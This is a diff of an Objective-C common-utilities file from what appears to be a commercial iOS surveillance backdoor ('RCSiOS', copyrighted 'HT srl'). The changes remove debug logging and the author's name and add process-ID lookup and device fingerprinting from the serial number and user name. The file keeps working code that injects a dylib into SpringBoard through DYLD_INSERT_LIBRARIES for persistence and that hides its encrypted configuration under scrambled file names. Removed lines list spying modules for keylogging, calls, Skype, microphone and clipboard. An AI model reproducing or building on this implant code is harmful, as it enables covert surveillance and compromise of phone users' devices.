@@ -1,9 +1,9 @@
 /*
- * RCSIpony - RCSICommon
+ * RCSiOS - RCSICommon
  *  A common place for shit of (id) == (generalization FTW)
  *
  *
- * Created by Alfredo 'revenge' Pesoli on 08/09/2009
+ * Created on 08/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
@@ -19,10 +19,7 @@
 #import "RCSIEncryption.h"
 #import "RCSICommon.h"
 
-//#define DEBUG_LOG
-//#define DEBUG_TMP
 //#define DEBUG
-
 
 FILE *logFD = NULL;
 
@@ -71,23 +68,16 @@ NSString *gBackdoorName             = nil;
 NSString *gBackdoorUpdateName       = nil;
 NSString *gConfigurationName        = nil;
 NSString *gConfigurationUpdateName  = nil;
+NSString *gCurrInstanceIDFileName   = nil;
+NSString *gCurrInstanceID           = nil;
 NSData   *gSessionKey               = nil;
-int       gLockSock                 = -1;
 
 // OS version
 u_int gOSMajor  = 0;
 u_int gOSMinor  = 0;
 u_int gOSBugFix = 0;
 
-u_int remoteAgents[8] = { OFFT_KEYLOG,
-                          OFFT_VOICECALL,
-                          OFFT_SKYPE,
-                          OFFT_URL,
-                          OFFT_MOUSE,
-                          OFFT_MICROPHONE,
-                          OFFT_IM,
-                          OFFT_CLIPBOARD };
-
+// Core Version
 u_int gVersion      = 2012041601;
 
 int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
@@ -98,22 +88,13 @@ int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
   static const int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
   size_t          length;
   
-  // a valid pointer procList holder should be passed
-  //assert(procList != NULL);
-  // But it should not be pre-allocated
-  //assert (*procList == NULL);
-  // a valid pointer to procCount should be passed
-  //assert (procCount != NULL);
-  
   *procCount = 0;
   
   result = NULL;
   done = false;
   
   do
-    {
-      //assert (result == NULL);
-      
+    {     
       // Call sysctl with a NULL buffer to get proper length
       length = 0;
       err = sysctl ((int *)name, (sizeof (name) / sizeof (*name)) - 1, NULL, &length, NULL, 0);
@@ -138,7 +119,6 @@ int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
             done = true;
           else if (err == ENOMEM)
             {
-              //assert (result != NULL);
               free(result);
               result = NULL;
               err = 0;
@@ -158,8 +138,6 @@ int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
   if (err == 0)
     *procCount = length / sizeof (kinfo_proc);
   
-  //assert ((err == 0) == (*procList != NULL ));
-  
   return err;
 }  
 
@@ -176,34 +154,65 @@ NSArray *obtainProcessList ()
     return nil;
   
   processList = [NSMutableArray arrayWithCapacity: numProcs];
+  
   for (i = 0; i < numProcs; i++)
     {
       procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
-#ifdef DEBUG
-      NSLog(@"Process: %@", procName);
-#endif
       [processList addObject: [procName lowercaseString]];
     }
   
   free (allProcs);
-  return [processList autorelease];
+  return processList;
 }
 
 BOOL findProcessWithName (NSString *aProcess)
 {
-  NSArray *processList;
+  NSArray *processList = obtainProcessList();
   
-  processList = obtainProcessList();
   [processList retain];
   
   for (NSString *currentProcess in processList)
     {
-      //if (strcmp([currentProcess UTF8String], [[aProcess lowercaseString] UTF8String]) == 0)
       if (matchPattern([currentProcess UTF8String], [[aProcess lowercaseString] UTF8String]))
         return YES;
     }
   
   return NO;
+}
+
+pid_t getPidByProcessName (NSString *aProcess)
+{
+  int i;
+  pid_t pid = -1;
+  
+  kinfo_proc *allProcs = NULL;
+  size_t numProcs;
+  NSString *procName;
+  
+  int err =  getBSDProcessList (&allProcs, &numProcs);
+
+  if (err)
+    return pid;
+  
+  for (i = 0; i < numProcs; i++)
+    {
+      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+      
+      procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
+      
+      if ([procName isEqualToString: aProcess] == YES)
+        {
+          pid = allProcs[i].kp_proc.p_pid;
+          [pool release];
+          break;
+        }
+    
+      [pool release];
+    }
+  
+  free (allProcs);
+  
+  return pid;
 }
 
 BOOL isAddressOnLan (struct in_addr firstIp,
@@ -317,6 +326,42 @@ NSString *getSystemSerialNumber()
 
   NSString *id = [[UIDevice currentDevice] uniqueIdentifier];
   return id;
+}
+
+NSString *getCurrInstanceID()
+{
+  NSMutableString *_instanceID = nil;
+  
+  if (gCurrInstanceID != nil)
+    return gCurrInstanceID;
+  
+  _instanceID = [[NSString alloc] initWithContentsOfFile: gCurrInstanceIDFileName 
+                                                encoding: NSUTF8StringEncoding 
+                                                   error: nil];
+  if (_instanceID == nil)
+    {
+      NSString *serialNumber = getSystemSerialNumber();
+      
+      NSMutableString *tmpinstID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
+      
+      NSString *userName = NSUserName();
+      
+      if (userName != nil)
+        [tmpinstID appendString: userName];
+      
+      [tmpinstID writeToFile: gCurrInstanceIDFileName 
+                  atomically: YES 
+                    encoding: NSUTF8StringEncoding 
+                       error: nil];
+    
+      _instanceID = [[NSString alloc] initWithString: tmpinstID];
+    
+      [tmpinstID release];
+    }
+  
+  gCurrInstanceID = _instanceID;
+  
+  return gCurrInstanceID;
 }
 
 int matchPattern(const char *source, const char *pattern)
@@ -460,16 +505,8 @@ NSMutableDictionary *openRcsPropertyFile()
   NSRange              range;
   
   // Using the config aes key
-#ifdef DEV_MODE
-  unsigned char        dKey[CC_MD5_DIGEST_LENGTH];
-  
-  CC_MD5(gConfAesKey, strlen(gConfAesKey), dKey);
-  NSData *keyData = [NSData dataWithBytes: dKey
-                                   length: CC_MD5_DIGEST_LENGTH];
-#else
   NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
-#endif
   
   RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
   NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
@@ -477,10 +514,6 @@ NSMutableDictionary *openRcsPropertyFile()
   
   NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
   NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];
-  
-#ifdef DEBUG
-  NSLog(@"openRcsPropertyFile: opening prop file %@", pFileName);
-#endif 
   
   if (![[NSFileManager defaultManager] fileExistsAtPath: pFileName])
     return nil;
@@ -521,24 +554,17 @@ NSMutableDictionary *openRcsPropertyFile()
 
 id rcsPropertyWithName(NSString *name)
 { 
-  id dict = nil;
-  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  id dict = nil;
    
   NSDictionary *temp = openRcsPropertyFile();  
   
   if (temp == nil)
     {
-#ifdef DEBUG
-      NSLog(@"rcsPropertyWithName: file do not exist!");
-#endif 
       [pool release];
       return nil;
     }
-
-#ifdef DEBUG
-  NSLog(@"%s: plist %@", __FUNCTION__, temp);
-#endif
   
   dict = (id)[[temp objectForKey: name] retain];
   
@@ -549,58 +575,39 @@ id rcsPropertyWithName(NSString *name)
 
 BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary)
 {
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
   NSString      *error = nil;
   NSRange       range;
   NSMutableData *propData;
-  
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
   // Try to open existing plist
   NSMutableDictionary *temp = openRcsPropertyFile();  
   
   if (temp == nil)
     {
-      // No prop file: we setting the new dict
-#ifdef DEBUG
-      NSLog(@"setRcsPropertyWithName: prop file do not exist, create using current dictionary!");
-#endif 
       temp = (NSMutableDictionary *) dictionary;
     }
   else 
     {
       if ([temp objectForKey: name] != nil)
         {
-          // Replacing the new prop
           [temp removeObjectForKey: name];
           [temp setObject: [dictionary objectForKey: name] forKey: name];
         }
       else 
         {
-          // Plist file is already created but not by the calling class
-          // we add it
-          //NSDictionary *addDict = [[NSDictionary alloc] initWithObjectsAndKeys: dictionary, name, nil];
-          //[temp addEntriesFromDictionary: addDict];
-          //[addDict release];
           [temp addEntriesFromDictionary: dictionary];
         }
     }
 
-  // The clear form plist
   NSData *pListData = [NSPropertyListSerialization dataFromPropertyList: temp
                                                                  format: NSPropertyListXMLFormat_v1_0
                                                        errorDescription: &error];
 
-  // Using conf aes key
-#ifdef DEV_MODE
-  unsigned char eKey[CC_MD5_DIGEST_LENGTH];
-  CC_MD5(gConfAesKey, strlen(gConfAesKey), eKey);
-  NSData *keyData = [NSData dataWithBytes: eKey
-                                   length: CC_MD5_DIGEST_LENGTH];
-#else
   NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
-#endif
-  
+
   // Scrambled name
   RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
   NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
@@ -611,13 +618,6 @@ BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary)
 
   // Unpadded length
   int len = [pListData length];
-
-#ifdef DEBUG
-  NSString *pFileName_clr = [pFilePath stringByAppendingPathComponent: RCS_PLIST_CLR];
-  NSLog(@"setRcsPropertyWithName: create prop file clear in %@ (enc %@)", pFileName_clr, pFileName);
-  [pListData writeToFile: pFileName_clr
-              atomically: YES];
-#endif 
 
   // Try the encryption
   if ([((NSMutableData *)pListData) encryptWithKey: keyData] == kCCSuccess)
@@ -636,9 +636,9 @@ BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary)
       [propData replaceBytesInRange: range withBytes: [pListData bytes]];
 
       [propData writeToFile: pFileName atomically: YES];
+      
+      [propData release];
     }
-
-  [propData release];
   
   [pool release];
   
@@ -647,7 +647,6 @@ BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary)
 
 BOOL injectDylib(NSString *sbPathname)
 {
-  //NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
   NSString *errorDesc = nil;
   NSString *dylibPathname = [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
   
@@ -655,9 +654,6 @@ BOOL injectDylib(NSString *sbPathname)
   
   if (sbData == nil)
     {
-#ifdef DEBUG_TMP
-      NSLog(@"%s: error on opening file %@", __FUNCTION__, sbPathname);
-#endif
       return NO;
     }
   
@@ -669,9 +665,6 @@ BOOL injectDylib(NSString *sbPathname)
   
   if (sbDict == nil)
     {
-#ifdef DEBUG_TMP
-      NSLog(@"%s: error on getting dictionary from file %@", __FUNCTION__, sbPathname);
-#endif
       return NO;
     }
   
@@ -679,16 +672,9 @@ BOOL injectDylib(NSString *sbPathname)
                               dylibPathname, @"DYLD_INSERT_LIBRARIES", nil];
   
   NSMutableDictionary *sbEnvDict = (NSMutableDictionary *)[sbDict objectForKey: @"EnvironmentVariables"];
-
-#ifdef DEBUG_TMP
-  NSLog(@"%s: DYLD_INSERT_LIBRARIES = %@", __FUNCTION__, dylibDict);
-#endif 
   
   if (sbEnvDict == nil) 
     {
-#ifdef DEBUG_TMP
-      NSLog(@"%s: EnvironmentVariables not found create new entry", __FUNCTION__);
-#endif
       // No entry...
       NSDictionary *envVarDict = [[NSDictionary alloc] initWithObjectsAndKeys: 
                                   dylibDict, @"EnvironmentVariables", nil];
@@ -700,24 +686,15 @@ BOOL injectDylib(NSString *sbPathname)
     }
   else 
     {
-#ifdef DEBUG_TMP
-      NSLog(@"%s: EnvironmentVariables entry found", __FUNCTION__);
-#endif
       NSString *envObjOut = nil;
       NSString *envObjIn  = (NSString *) [sbEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
       
       if (envObjIn == nil) 
         {
-#ifdef DEBUG_TMP
-          NSLog(@"%s: DYLD_INSERT_LIBRARIES not found create new entry", __FUNCTION__, sbPathname);
-#endif
           [sbEnvDict addEntriesFromDictionary: dylibDict];
         }
       else 
         {
-#ifdef DEBUG_TMP
-          NSLog(@"%s: DYLD_INSERT_LIBRARIES found %@", __FUNCTION__, envObjIn);
-#endif
           NSRange sbRange;
           
           // Check if already present
@@ -728,12 +705,6 @@ BOOL injectDylib(NSString *sbPathname)
               envObjOut = [[NSString alloc] initWithFormat: @"%@:%@", envObjIn, dylibPathname];
         
               [sbEnvDict setObject: envObjOut forKey: @"DYLD_INSERT_LIBRARIES"];
-        
-#ifdef DEBUG_TMP
-              NSLog(@"%s: DYLD_INSERT_LIBRARIES new entry = %@", 
-                    __FUNCTION__, 
-                    (NSString *) [sbEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"]);
-#endif
             }
         }
       
@@ -757,9 +728,8 @@ BOOL injectDylib(NSString *sbPathname)
   return YES;
 }
 
-BOOL removeDylib(NSString *sbPathname)
+BOOL removeDylibFromPlist(NSString *sbPathname)
 {
-  //NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
   NSString *dylibPathname = [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
   NSString *errorDesc = nil;
   
@@ -767,9 +737,6 @@ BOOL removeDylib(NSString *sbPathname)
   
   if (sbData == nil)
     {
-#ifdef DEBUG_TMP
-      NSLog(@"%s: error on opening file %@", __FUNCTION__, sbPathname);
-#endif
       return NO;
     }
   
@@ -781,43 +748,26 @@ BOOL removeDylib(NSString *sbPathname)
   
   if (sbDict == nil)
     {
-#ifdef DEBUG_TMP
-      NSLog(@"%s: error on getting dictionary from file %@", sbPathname);
-#endif
       return NO;
     }
   
   NSMutableDictionary *sbEnvDict = (NSMutableDictionary *)[sbDict objectForKey: @"EnvironmentVariables"];
-  
-#ifdef DEBUG_TMP
-  NSLog(@"%s: EnvironmentVariables found %@", __FUNCTION__, sbEnvDict);
-#endif
-  
+
   if (sbEnvDict != nil) 
     {
       NSMutableString *envObjOut = nil;
       NSString *envObjIn  = (NSString *)[sbEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
       
       if (envObjIn != nil) 
-        {
-#ifdef DEBUG_TMP
-          NSLog(@"%s: DYLD_INSERT_LIBRARIES found %@", __FUNCTION__, envObjIn);
-#endif     
+        {    
           NSRange dlRange = [envObjIn rangeOfString: dylibPathname];
-        
-#ifdef DEBUG_TMP
-          NSLog(@"%s: dylibPathname in range %d %d", __FUNCTION__, dlRange.location, dlRange.length);
-#endif          
+          
           if (dlRange.location != NSNotFound &&
               dlRange.length   != 0) 
             {
               // check if we're alone
               if ([envObjIn length] == [dylibPathname length])
                 {
-#ifdef DEBUG_TMP
-                  NSLog(@"%s: envObjIn.length %d  dylibPathname length %d", 
-                        __FUNCTION__, [envObjIn length], [dylibPathname length]);
-#endif
                   // Yes alone remove the subdictionary
                   [sbDict removeObjectForKey: @"EnvironmentVariables"];
                 }
@@ -829,18 +779,11 @@ BOOL removeDylib(NSString *sbPathname)
                 
                   // remove the colon too
                   dlRange.length++;
-                
-#ifdef DEBUG_TMP
-                  NSLog(@"%s: delete chars in range %d %d", 
-                      __FUNCTION__, dlRange.location, dlRange.length);
-#endif        
+                       
                   envObjOut = [[NSMutableString alloc] initWithString: envObjIn];
                   [envObjOut deleteCharactersInRange: dlRange];
                   [sbEnvDict setObject: envObjOut forKey: @"DYLD_INSERT_LIBRARIES"];
-#ifdef DEBUG_TMP
-                  NSLog(@"%s: new val %@", 
-                        __FUNCTION__, envObjOut);
-#endif 
+
                   [envObjOut release];
                 }
             }
